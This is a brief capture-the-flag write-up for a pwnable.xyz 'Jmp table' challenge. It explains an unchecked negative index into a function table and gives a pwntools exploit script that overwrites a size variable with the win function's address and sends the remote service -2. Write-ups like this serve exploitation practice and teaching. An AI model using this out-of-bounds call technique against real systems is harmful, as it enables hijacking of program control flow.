# Jmp table

The challenge doesn't check if the function selector is negative, which we can use to select a function behind the function selector.

8 bytes before the function_selector lies  the size global variable.

Overwriting the size variable with the address of the win function we can then call the function selector with -2 and win.

```py
from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
p = process(e.path)
p = remote('svc.pwnable.xyz',30007)

win = str(e.symbols['_'])
print(win)


p.recvuntil(b'> ')
p.sendline(b'1')
p.sendlineafter(b'Size: ',win)
p.recvuntil(b'> ')
p.sendline(b'-2')

p.interactive()
```
